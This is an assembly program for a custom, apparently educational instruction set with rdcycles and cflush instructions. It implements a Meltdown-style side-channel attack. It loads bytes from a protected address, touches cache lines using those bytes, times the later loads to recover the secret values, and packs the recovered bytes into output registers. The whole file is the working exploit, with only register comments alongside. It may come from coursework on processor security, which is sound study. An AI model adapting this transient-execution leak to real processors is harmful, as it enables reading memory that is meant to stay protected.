# r1: start rcycles
# r2: end rcycles
# r3: delta rcycles
# r4: current target addr
# r5: index of output register
# r6: byte # of output register
# r10: addr for hit check
# r11: 4 (uncached load delta rcycles)
# r12: 256
# r13: current offset
# r14: actual value of secret byte
# r15: output
# r16: output
# r17: output
# r18: output
# r20: protected load dest
# r21: value for leak write
# r24: hit addr for offset 0
# r25: 1
# r26: 2
# r27: 3
# r28: error indicator
# r29: no hit indicator

addi r4 r0 0x19800
addi r11 r0 4
addi r12 r0 256
addi r25 r0 1
addi r26 r0 2
addi r27 r0 3

try_offset_0:
lb r20 0(r4)
sb r21 0(r20)
add r0 r0 r0
add r0 r0 r0

try_offset_1:
lb r20 0(r4)
sb r21 1(r20)
add r0 r0 r0
add r0 r0 r0

try_offset_2:
lb r20 0(r4)
sb r21 2(r20)
add r0 r0 r0
add r0 r0 r0

try_offset_3:
lb r20 0(r4)
sb r21 3(r20)
add r0 r0 r0
add r0 r0 r0

exception:
rdcycles r1
lb r22 0(r10)
rdcycles r2
sub r3 r2 r1
bne r3 r11 hit
addi r10 r10 4
beq r10 r12 no_hit
jal r0 exception

hit:
beq r13 r0 check_offset_0
beq r13 r25 check_offset_1
beq r13 r26 check_offset_2
beq r13 r27 check_offset_3
jal r0 error

check_offset_0:
add r24 r0 r10
addi r13 r13 1
cflush
jal r0 try_offset_1

check_offset_1:
bne r10 r24 offset_1_success
addi r13 r13 1
cflush
jal r0 try_offset_2

check_offset_2:
bne r10 r24 offset_2_success
addi r13 r13 1
cflush
jal r0 try_offset_3

check_offset_3:
bne r10 r24 offset_3_success
addi r14 r24 0
jal r0 output_byte

offset_1_success:
addi r14 r24 3
jal r0 output_byte

offset_2_success:
addi r14 r24 2
jal r0 output_byte

offset_3_success:
addi r14 r24 1
jal r0 output_byte

output_byte:
beq r14 r0 done
beq r5 r0 output_r15
beq r5 r25 output_r16
beq r5 r26 output_r17
beq r5 r27 output_r18
jal r0 done

output_r15:
or r15 r15 r14
beq r6 r27 incr_r5
slli r15 r15 8
addi r6 r6 1
jal r0 next_byte

output_r16:
or r16 r16 r14
beq r6 r27 incr_r5
slli r16 r16 8
addi r6 r6 1
jal r0 next_byte

output_r17:
or r17 r17 r14
beq r6 r27 incr_r5
slli r17 r17 8
addi r6 r6 1
jal r0 next_byte

output_r18:
or r18 r18 r14
beq r6 r27 incr_r5
slli r18 r18 8
addi r6 r6 1
jal r0 next_byte

incr_r5:
addi r5 r5 1
addi r6 r0 0
jal r0 next_byte

next_byte:
addi r4 r4 6
addi r10 r0 0
addi r13 r0 0
cflush
jal r0 try_offset_0

no_hit:
addi r29 r0 1
jal r0 done

error:
addi r28 r0 1

done:
